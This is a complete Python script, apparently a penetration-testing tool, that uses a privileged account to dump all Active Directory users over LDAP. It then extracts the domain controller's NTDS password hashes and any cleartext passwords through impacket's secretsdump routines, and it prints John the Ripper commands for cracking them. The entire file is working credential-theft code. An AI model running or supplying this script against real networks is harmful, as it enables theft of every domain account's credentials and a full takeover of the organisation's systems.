#!/usr/bin/python3

import click
import socket
import os
import ldapdomaindump as ldd
from impacket.smbconnection import SMBConnection
from impacket.examples.secretsdump import RemoteOperations, NTDSHashes

def getUsersInfo(user, password, domain, ip):
    print("[*] Trying to dump users info with LDAP...")
    s = ldd.Server(ip, get_info=ldd.ALL)
    c = ldd.Connection(s, user=f"{domain}\\{user}", password=password, authentication=ldd.NTLM)
    if not c.bind():
        print("[!] Could not bind to LDAP with specified credentials")
        exit(1)
    print("[+] Successful bind to LDAP with specified credentials")
    cnf = ldd.domainDumpConfig()
    cnf.outputhtml = False
    cnf.outputjson = False
    dd = ldd.domainDumper(s, c, cnf)
    print("[*] Dumping users info...")
    dd.users = dd.getAllUsers()
    dd.groups = dd.getAllGroups()
    rw = ldd.reportWriter(cnf)
    rw.generateUsersReport(dd)
    os.rename("domain_users.grep", "USERS_INFO.txt")
    print("[+] Successful dump of the users information in USERS_INFO.txt")


def getNTDSInfo(user, password, domain, ip):
    print("[*] Trying to dump Domain users hashes...")
    conn = SMBConnection(ip, ip, None, 445)
    if conn.login(user, password, domain):
        print("[+] Successful SMB connection to the DC")
    r = RemoteOperations(conn, True)
    r.enableRegistry()
    bootkey = r.getBootKey()
    print("[*] Creating and parsing NTDS...")
    NTDSFileName = r.saveNTDS()
    NTDS = NTDSHashes(NTDSFileName, bootkey, isRemote=True, history=False, noLMHash=False, remoteOps=r, useVSSMethod=True, resumeSession=None, printUserStatus=False, outputFileName='DOMAIN_HASHES')
    print("[+] Success")
    print("[*] Dumping hashes from NTDS (could take a while)...")
    NTDS.dump()
    NTDS.finish()
    r.finish()
    conn.close()
    os.rename("DOMAIN_HASHES.ntds", "DOMAIN_HASHES.txt")
    os.remove("DOMAIN_HASHES.ntds.kerberos")
    if os.stat("DOMAIN_HASHES.ntds.cleartext").st_size == 0:
        os.remove("DOMAIN_HASHES.ntds.cleartext")
    else:
        print("[+] Cleartext passwords founds ! look in the file DOMAIN_HASHES.ntds.cleartext")
    print("[+] Successful dump of the users hashes in DOMAIN_HASHES.txt")
    print("You can use 'john --format=NT DOMAIN_HASHES.txt' to crack passwords and 'john --format=NT --show DOMAIN_HASHES.txt | cut -d: -f 1,2 > JOHN_RESULT.txt' when you finished")


@click.command()
@click.option('--user', help='A privileged user of the Domain')
@click.option('--password', prompt='Password', help='The password of the user (can be omitted to avoid password in bash history, the password will be prompted)')
@click.option('--domain', help='The domain to dump the user database')
def main(user, password, domain):
    click.echo(f"[*] Info will be dumped with user {user} over the domain {domain}")
    ip = socket.gethostbyname(domain)
    click.echo(f"[*] Domain {domain} was resolved to the IP: {ip}")
    getUsersInfo(user, password, domain, ip)
    getNTDSInfo(user, password, domain, ip)

if __name__ == '__main__':
    main()
